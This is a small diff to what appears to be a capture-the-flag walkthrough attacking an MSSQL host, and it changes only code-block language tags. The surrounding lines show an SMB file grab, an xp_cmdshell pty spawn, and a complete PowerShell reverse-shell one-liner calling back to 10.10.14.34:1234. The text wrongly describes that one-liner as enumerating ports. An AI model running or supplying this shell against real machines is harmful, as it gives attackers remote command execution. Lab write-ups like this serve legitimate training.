@@ -331,7 +331,7 @@ smb: \>
 Note that another command for `ls` is `dir` in samba client.
 
 We run `get prod.dtsConfig` to get the file in the backup directory.  It looks like this:
-```SSIS
+```
 <DTSConfiguration>
     <DTSConfigurationHeading>
         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
@@ -420,7 +420,7 @@ SQL> xp_cmdshell "python -c 'import pty; pty.spawn("/bin/bash")'"
 ```
 
 However, I searched online and found this, which will enumerate ports on the system (using powershell) so that we can get a reverse shell:
-```ps
+```powershell
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.34", 1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()
 ```
 
